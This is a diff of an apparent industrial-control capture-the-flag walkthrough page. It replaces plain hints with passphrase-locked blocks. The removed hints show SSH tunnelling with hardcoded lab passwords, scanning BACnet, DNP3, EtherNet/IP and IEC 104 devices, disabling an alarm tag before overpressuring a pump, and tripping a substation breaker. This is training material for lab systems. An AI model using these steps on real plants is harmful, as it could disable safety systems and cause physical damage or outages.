@@ -332,10 +332,7 @@ Password: hist0ry!</pre>
       <h3>Step 1: Think Beyond TCP</h3>
       <p>Your earlier scans used <code>-sT</code> which only scans TCP. Many industrial protocols use <b>UDP</b> instead.</p>
       <p><b>Hint:</b> Building automation commonly uses UDP port 47808.</p>
-      <details class="reveal guide"><summary>How to scan UDP?</summary><div class="reveal-body">
-        <pre>sudo nmap -sU -p 47808 10.0.1.20</pre>
-        <p>Note: UDP scans require <code>sudo</code>.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="Y4aPiCY3Q1TMRMUwFzkUdg==.YzPoUik9wSlr/Scv.zPq4HIw9XNJX/Nsgg8ZUvB+LFKlQ+DL6XUlDvnDEdpDfNh41YTDIF2KajJwpQcllxQ/HW2othb+w04s2o8eU8wXUSZSN36otZz9KzXHwVE3LiAkgSG7DMAqHvWLfkEruWAQRWAzoq8ptPBNPfs8ae6ssEE1+ZNTjyCNMSbbj0i3qmBttRg=="><summary>How to scan UDP? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 2: What is BACnet?</h3>
       <p>BACnet (Building Automation and Control Networks) controls:</p>
@@ -349,9 +346,7 @@ Password: hist0ry!</pre>
 
       <h3>Step 3: Discover the Device</h3>
       <p>Use the BACnet tool to find out what's running.</p>
-      <details class="reveal guide"><summary>How?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/bacnet-tool.py -t 10.0.1.20 -c scan</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="ldyX3O+FcR8LkvbB6RMy9A==.PuWhNYTpTdDNrX6C.VoNXAb88GLKvumsg5jfU/Oi76GswZwvn8wMLEBlrTLxuTQXyToO2TV302yKwNEEd9kw08ovV4Bn2uwEmXjYgOdCmWqFAIoGBm2R5jb1UyUkcC9yVoGPLu0nO5Jh62g=="><summary>How? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 4: Enumerate Objects</h3>
       <p>BACnet organizes data as objects:</p>
@@ -361,18 +356,13 @@ Password: hist0ry!</pre>
         <li><b>BI</b> (Binary Input) - on/off states</li>
       </ul>
       <p>List everything on the device.</p>
-      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/bacnet-tool.py -t 10.0.1.20 -c list</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="dImL2sjgxceE7ZkA0UWfvA==.o/16I0mvdBITqKjG.5PUz3Egq/MriwowrUv3CkDR9Mi3NyVuV9nVshNSGFsr9G3CTd/JL6O4wgavVAIl4r0abeA/bFvD0blPerlhqDgWDLd+W4P3DTSL2dnddKJmzYAihB9HopCP14QdBug=="><summary>Command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Look carefully at the output.</b> Some objects have unusual instance numbers - those are worth investigating.</p>
 
       <h3>Step 5: Dig Deeper</h3>
       <p>A thorough pentester doesn't just read values - they check all properties of interesting objects. BACnet objects have properties like Present-Value (85), Description (28), and Object-Name (77).</p>
       <p><b>Hint:</b> An object with an unusual instance number might have something hidden in its Description.</p>
-      <details class="reveal guide"><summary>How to read all properties?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/bacnet-tool.py -t 10.0.1.20 -c read-all --type AV --instance &lt;number&gt;</pre>
-        <p>Try different instances, especially unusual ones.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="Uy7ofW96hlISiXhsItj7Bg==.EgltsHH23KeUbi4a.03Fd/BOiOq9lqW6W15712m+HmPtYLi4TahAxHJvxv+XAKlXPwtmtbncz3uu/ULSSSbjfoxeWz7Pjo92HpdQue1Lu1bF3/aTxiTI5+SMdsqbbCW1Xox+IRhBbiXPbxGM25uFHOoj+V/N94ELW0v8HktE6q2W1lhbt8+3y3iW8AaC+QP5fygbVotQo6dQJEkt1a8jp9EP21SZ67FFha9iw9QfmZUAIpmJmOwFSm/gfSWURBmjsBBgkdoAH1kMNAh/G8Z+OeO3cJA=="><summary>How to read all properties? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>What You Learned</h3>
       <ul>
@@ -404,27 +394,17 @@ Password: hist0ry!</pre>
       <h3>Step 1: Scan the Process Network</h3>
       <p>You need to scan from the EWS, or set up tunnels from Kali.</p>
       <p><b>Hint:</b> Set up a double SSH tunnel - Kali → Jump Host → EWS.</p>
-      <details class="reveal guide"><summary>Tunnel commands?</summary><div class="reveal-body">
-        <pre># Tunnel 1: Reach EWS SSH through Jump Host
-sshpass -p 'maint2024!' ssh -f -N -L 2222:10.0.3.20:22 maintenance@10.0.2.20
-
-# Now you can SSH to EWS via localhost:2222
-sshpass -p 'eng2024!' ssh -p 2222 engineer@127.0.0.1 'nmap -sT 10.0.4.0/24 2>/dev/null'</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="zwPNxAG9N8GudaXgSGa55A==.lAks1DcKt6PDFYwg.SOaMjzkO0WUkLpDsdwpPvohYzA07IXrGKiUyExjYjt6HTo3j4vs4Bc8pAtkJ9WVvAwgdfR+h8M5GjL/YhkrsSfRrgc7DDw8WGomhqhDWTkP3tjsP8GfbS3sINymA78d8wr2b43pUtzr9j07lXxp7q/6XnZWIGxcH9yz3Xh+M5y5wJ7pT/XfiZG9OrV72cjVhZ4qhKD+YFXANMUcWEjRD7VYWtyz1ZJI3jG2m0R3nE7uU+xAqwePfWy4UMrkogctzApleuW5oXsqVdRgU+0nrVNtMmWiHWv4ygfgkhrRuy187+d3PI4NnZTAmtaWgHakTLx0BYA9Ww2r1MIAkKe7TSFQ15VTSb3KrhfSGiMLsrsdjFwFg/c2Hy29xMoEA6XKjdXhPZm/dkoM="><summary>Tunnel commands? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>What to look for:</b> Multiple PLCs on different ports. One of them is on port 20000.</p>
 
       <h3>Step 2: Identify the Protocol</h3>
       <p>Port 20000 isn't standard for Modbus (502) or EtherNet/IP (44818). Research what SCADA protocol uses port 20000.</p>
       <p><b>Hint:</b> It's a protocol designed by GE for electric utilities, now used worldwide in water and power.</p>
-      <details class="reveal guide"><summary>Answer</summary><div class="reveal-body">
-        <p>DNP3 (Distributed Network Protocol 3) - commonly on port 20000. Used in the Ukraine power grid attack (2015).</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="oMCR+4dHgPijyRMpjkHa4w==.HUuMMAlFN3pWmlGF.8kdm1zx9xr9Y+KdJ+awknFBUegH0xdiEOEpnaVJ2UF0L9nDMpSYxsFtuLs2Fab5TRRzENIu9UR0N+pX+UmhKKf+J0ImC7Jq0hFNgz0UsCp/2p3oYMvN9wlRyY7uXYtgjBA0inLlDx0JDdaQ5X/U3tLhGqwrhaRxHZcdVhrxfaLPGz8UP+6LR+sEb0RukSnSGrMpOzA=="><summary>Answer <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 3: Set Up a Tunnel and Connect</h3>
       <p>Forward port 20000 through the EWS to Kali.</p>
-      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
-        <pre>sshpass -p 'eng2024!' ssh -f -N -L 20000:10.0.4.103:20000 -p 2222 engineer@127.0.0.1</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="BrM6ep7jU1fWZzKpVtmDZQ==.VWtrsMfEkU489XMO.dbFgEorcGFkpgmf3VIEdLG2awljt1aYIcfvyRk6bESudL+rJBF+GBTc4Ec4gGJTq0RBx1jErdrOmke/zln++705MhS0QDMREIWgg+Jrbh0XmumKLNn/IXIrta6qV8Nle9WVMekKpwLfUhLtOSsp9dYYewUzcYCM8jNCtOA3e6A=="><summary>Tunnel command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p>Now use the DNP3 tool to scan and read:</p>
       <pre>python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c scan
 python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c read</pre>
@@ -432,9 +412,7 @@ python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c read</pre>
       <h3>Step 4: Analyze the Data</h3>
       <p>The read command returns binary inputs, analog inputs, and <b>counters</b>. Look at the counter values carefully.</p>
       <p><b>Hint:</b> The counter values are small numbers. Could they represent something other than counts?</p>
-      <details class="reveal guide"><summary>Another hint</summary><div class="reveal-body">
-        <p>Look at the ASCII column next to each counter value. What do the characters spell?</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="Gcu37Mvm3063akMwMwYLFA==.PwlHlHxlWrkKvPJw.euOBr2TCv+m7fAqYpeYqkaJWyvpNUtbif1KmA1JWXotjY/l1bexqOmUQ2pW0Tz4azyTZDWXf62TC8xoYTKHX08lBpVwF+U4H6HwhPpse49s59+WTnkPjdiFYbwRKXsccM/tvEC2XLrANk/o8zPYQomPzQ47a2Ms/PQ=="><summary>Another hint <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 5: The CRC Challenge</h3>
       <p>DNP3 uses CRC-16 checksums for data integrity. The counter values encode a message. To prove you understand the protocol, you need to:</p>
@@ -444,27 +422,11 @@ python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c read</pre>
         <li>Write the CRC value back to the outstation</li>
       </ol>
       <p><b>The tool does NOT calculate CRC for you - you must write your own.</b></p>
-      <details class="reveal guide"><summary>CRC-16-DNP algorithm</summary><div class="reveal-body">
-        <pre>python3 -c "
-data = b'&lt;YOUR_MESSAGE_HERE&gt;'
-crc = 0
-for byte in data:
-    crc ^= byte
-    for _ in range(8):
-        if crc & 1:
-            crc = (crc >> 1) ^ 0xA6BC
-        else:
-            crc >>= 1
-crc = (crc ^ 0xFFFF) & 0xFFFF
-print('CRC:', crc)
-"</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="UWvRRfBWwucpYP3KgdFMaQ==.ZQmIhmUHNBggTAMR.xPZ4XqrQNSX2o3VcX/ShFmq52jeh2ApW3jxmiljFcLMkzQLGPV97jjXL9ED4t9EK0JHhYQh/ls8hi4Ifa3PMCaGJLISCWJY+fmQQgWQloAKazY65Iwj7CNyAV+VgqcPhyxapyKMw0JlkPdC3m+EoVUUHyRONSqJgQGildBqL8D+pW+p+SE6nkbgz8RHMt5/jZ/6d0PlS1c+jlwIqK/IGfGFjUdDw8nfIXHffxqCUHoXypY00YDGZUbVD3qKpnmLNur6W7LRpbX/7jP6CNm7Ydo8PfynKTSJ0EDxbbAcpuDs12r0qFTwC8qdlgD8wXnbUY9uVj+G+cfGoLqSK7Sn2XphejU679GDqaI73z8+ICgzBNZP3DFK/Bx1omYq09uvXm7KbqON7DcuAXdXp/g=="><summary>CRC-16-DNP algorithm <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 6: Send the CRC</h3>
       <p>Use the DNP3 tool's operate command with your calculated CRC value.</p>
-      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c operate -v &lt;your_crc_value&gt;</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="eytEEpBLYleSG6T9VHGjfQ==.Zr/srfSFxf56bwN7.1y56rRBwrq3Bx2hl8Coo5xKPAylaIq1VAl2fkHhdMTlLwrR2+TlVu6o7/vhB/oC06P+2ea7tRinREyuh2gVRpfrQSzFHKRTT69va9bjtGJ8bnsvJiaeARzkCxRMKkv20T9PUGNChUYOqHxewRLMU7i7dqpmbHMWuQA=="><summary>Command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p>If the CRC is correct, the outstation returns the flag in its response.</p>
 
       <h3>What You Learned</h3>
@@ -508,33 +470,24 @@ print('CRC:', crc)
 
       <h3>Step 2: Set Up a Tunnel</h3>
       <p>Forward port 44818 through the EWS to Kali.</p>
-      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
-        <pre>sshpass -p 'eng2024!' ssh -f -N -L 44818:10.0.4.104:44818 -p 2222 engineer@127.0.0.1</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="1VsjLhEJlJuK296/xxHMBA==.M8irWSrwyssp0gys.7SZWZMh2UpL4k6Ggren3y8IXR+ddZzf9qQoEkWzVdqm/Rl9ojh3fsDWeJfdFL7B/w/owmT7RItNbpABRpi1Ol4ILaQOaub+Zr9q3F+/vw3dH6CaOXIYVKVUyB5G03PCITkoLJKJkizuA+kB98Vu3p33TYVnqMNDMjM09sJFN5g=="><summary>Tunnel command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 3: Scan the PLC</h3>
       <p>Discover what tags (variables) the PLC exposes.</p>
-      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/enip-tool.py -t 127.0.0.1 -c scan</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="sW/qQLxOx8+IEKTuN2dtVA==.8yjzoojsR0OFA1hu.I2kDV5ZauP8I37+yXjZZXhM2JAh+IeZOD8oaSDoDXAxJ7GMhY8nOGCY7dChIlyZZBDrHjratpeWw/o0mdD6cdBL/HuIzbppnNz+r1iimM9fAXJiW2vmixANhIHc="><summary>Command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Study the tags carefully.</b> Which ones are writable? Which ones control the alarm? What's the threshold?</p>
 
       <h3>Step 4: Try the Obvious Attack</h3>
       <p>Switch to manual mode and crank the pump to 100%.</p>
       <p><b>Watch the HMI while you do this.</b></p>
-      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag MODE_SELECT --value 0
-python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --value 100</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="ujhhZhnmHY4f6MNhLW8H8g==.9Nsl6bQI1db1Kaih.iRJB+QBXJRkszTP2qXU6Ge7jqnrA52gAMag93E6Zk5zqu6Iz2RIWxKB5Cmswr/k0k/xxBGlfODEFN39dBD8V22Ik81Iteor8oUZFY53f3Ux84aFYgX97xJ3jsIQ7TWeJeEV3DG7sWh9tklwVDD9RT+Ef0E/O0LD2Qc25KP2OWHReEv9WBMVFqlRICfUKzO21iUQ1+U3iBj0OfZjKU5wtpZSV78GKatg4Xxs+JAvP/oqFNtlCi7MXC4ZGrZNmXUGUb6bZ5eRYlLSp2bkP40dv1hY="><summary>Commands? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>What happens?</b> Pressure rises... passes the threshold... <b>ALARM FIRES!</b> Everything resets. You failed.</p>
       <p>In a real system, operators would be alerted. A stealthy attacker wouldn't trip the alarm.</p>
 
       <h3>Step 5: Think Like Stuxnet</h3>
       <p>The Stuxnet worm disabled safety alerts BEFORE causing physical damage. The operators saw normal readings while centrifuges were being destroyed.</p>
       <p><b>What tag controls the alarm?</b> Can you disable it BEFORE causing overpressure?</p>
-      <details class="reveal guide"><summary>Hint</summary><div class="reveal-body">
-        <p>Look at the tag list from the scan. There's a tag that enables/disables the alarm. Write to it first, THEN cause the overpressure.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="Qna+uE2VhY7ccxm5t2T8/A==.Z7z4Ska624rZ4l5p.cHUmdfxvZ3d0tPGNsmTbuetleQ1ZjHNjR1pCNFSSTFB2L4jco2BWGnFhZCJRbYIeAPXcDkLeFLIetpREcjC76kWRqfP9jmNwz7iSlD/yP5IUfSmnKGp9VoXpVGVbVrE6sRU+CM19pg3HhMsDUR3MtglvkmCxPN5Q/TevuFjwzlVI7BbVgOnrATOdzTU5reCPcwC2U36SzEWXzsSSUQ8QSv1jmjArWrEHSQ=="><summary>Hint <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 6: The Right Order</h3>
       <ol>
@@ -543,9 +496,7 @@ python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --va
         <li>Then: max out the pump</li>
       </ol>
       <p><b>Watch the HMI</b> - pressure rises past the threshold but no alarm fires. The flag appears on the Distribution page.</p>
-      <details class="reveal guide"><summary>Need the exact commands?</summary><div class="reveal-body">
-        <p>Check the solution file - but try to figure out the order yourself first.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="Nsu2SuBC7PI4rE/lSNJ9qw==.EBt6+Y3JOS5tOnlx.Pkxfqt1BjFXpoNZuVcu+V3r9jNzNIrYq3fHs0kbQVihJlVYm9HZK1DeYEDCwswk8Ab2BrlERFIvOkmSfpQZmWG4zkijY/F60qXTGsgdAKVDOTVC9tgA0T8SsICeK2riCombW0wKG/YaFGfF3quu6QQ=="><summary>Need the exact commands? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>What You Learned</h3>
       <ul>
@@ -586,9 +537,7 @@ python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --va
 
       <h3>Step 2: Set Up a Tunnel</h3>
       <p>Forward port 2404 through the EWS.</p>
-      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
-        <pre>sshpass -p 'eng2024!' ssh -f -N -L 2404:10.0.4.105:2404 -p 2222 engineer@127.0.0.1</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="H3NchGQC/wryuXpdVzF4+Q==.7aU4TDIHq44fIh3j.ZIlBtEqBOh8yVV7C6l3dzhBSeseLwGEciZ8V6IFZKAR3hiEMnxkDLedprpyiu4kUnV3XhUwBPPvn93xG9kn2qtQn9imFX7ooHUqQN1HAHwkCl6F5Vt/rY+2Q/wSwCORxZqYh76bUjEOpo5M/vb0DUjBZQeiBTrYhpWlgRVY="><summary>Tunnel command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 3: Scan the Station</h3>
       <p>IEC 104 organizes data differently from Modbus or EtherNet/IP:</p>
@@ -598,27 +547,19 @@ python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --va
         <li><b>M_ME_NC_1</b> = measured value (voltage, frequency)</li>
         <li><b>C_SC_NA_1</b> = single command (control a breaker)</li>
       </ul>
-      <details class="reveal guide"><summary>Scan command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c scan</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="eo2ZgkfmxvB/Vmd1yyY4Lg==.owykoQNCx7SKuVJs.9gBd3uRBtSMkqQZufGMv04qWBkPTl4KNpm2dJVjk/n0RTpcCmLbOufS6h8E43ziNyTfYV83PISnXbrEXq9nuSI9Yyak9Gy5DHAuNpeJfNnGyEZ/PvYWZT8U5VO0rsA=="><summary>Scan command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Study the output.</b> Note which IOAs are status points and which are command points. The command points can CONTROL the breakers.</p>
 
       <h3>Step 4: Read Measurements</h3>
       <p>Get a detailed view of the substation state.</p>
-      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c read</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="lpvlH5TCmYd0d9D00l97EA==.WIid4vReiZFmGL+N.TpImDDTrci2N7YZUn1P4mFGNlUp8de1FBl2VNmrVUfGib+WziJtGrCtWQNy4/5dxSucOBL6AFF9aez0ZfxMj62Pai79H0N8VJ22GaIfAlMkdQ1FxtZ2ji16+GMr+4w=="><summary>Command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p>The main breaker at IOA 100 is CLOSED - it's supplying power to the entire plant.</p>
 
       <h3>Step 5: Trip the Main Breaker</h3>
       <p>The command IOA for the main breaker is listed in the scan output. Send a TRIP command to open it.</p>
       <p><b>Watch the HMI Power page when you do this.</b></p>
-      <details class="reveal guide"><summary>What value to use?</summary><div class="reveal-body">
-        <p>"trip" or "off" or "open" - the tool accepts all of these.</p>
-      </div></details>
-      <details class="reveal guide"><summary>Full command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c control --ioa &lt;command_ioa&gt; --value trip</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="yloalIKAe1NBaJ57PtOwGg==.91jamN48CrKhfnRj.4jcAziQ6R15hS5mHItxdOO9HCaT6p7fKoyMHAm3W0fDPecc8CTuPUf/X2+AaPUfH8jeT+TL4n5C26qL7UZ0ayOc1cdah3EyGbH5LtxKvlsbMZw/xYtbe6QyK4rulVY6zpw=="><summary>What value to use? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
+      <details class="reveal guide locked" data-k="6rE1szeafhAlNCffYqeKDA==.ZpJqoGnRKxJb9vJ5.XA18Vb4lgp8rlL5gGkvcPjAwDEQcbgeCtnPPFUHF+vWZloS/aqIk0gf7MZgzYVGIqXBfrL3pftM49SpHodcXUHaqkq+XjmGdNUyxX5jvNKg6roBm9B++X2ooGvVh413sx8WeZd/q6Pw8Kx+eMKO50GuWoUxAQNWtoggHeuIfp+sMW07lQtn9Jw=="><summary>Full command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>What happens on the HMI:</b> BLACKOUT flashes across the substation diagram. The main breaker turns RED (OPEN). The flag appears.</p>
 
       <h3>What You Learned</h3>
@@ -659,10 +600,7 @@ python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --va
 
       <h3>Step 2: Set Up a Tunnel</h3>
       <p>Forward Modbus port 502 through the EWS.</p>
-      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
-        <pre>sshpass -p 'eng2024!' ssh -f -N -L 502:10.0.4.102:502 -p 2222 engineer@127.0.0.1</pre>
-        <p>Note: Port 502 is privileged - may need sudo on some systems.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="kObLwP1Au5Eb+eswAtJL7A==.BUfeH0gPm15rMsoD.gnJmPVVb+yurvaJtEZibY74SaZzXXyXCulAXWykuRIDXTZqCbfE1AvbZuTwprcSH/OFyyKA3r5cCs25fvMJicKtTKh+kmg2Fz14XNtvhzTZYoil2G//iR1BGk3uFSv5D8ItBmg/DnpFxjjslcICjQWIy4qdmUMz1nD1Lvlx2VNDGYqntH3DeRtLvqHrEYqRVps7cIo6x7aayXvkFJS8JLSlpNctkvGEWZMIV8kPYLlQt9rU/XKmV0ai2hfLbEWSLMQscMpl4FGk="><summary>Tunnel command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 3: Scan the PLC</h3>
       <p>Modbus organizes data as numbered registers:</p>
@@ -672,9 +610,7 @@ python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --va
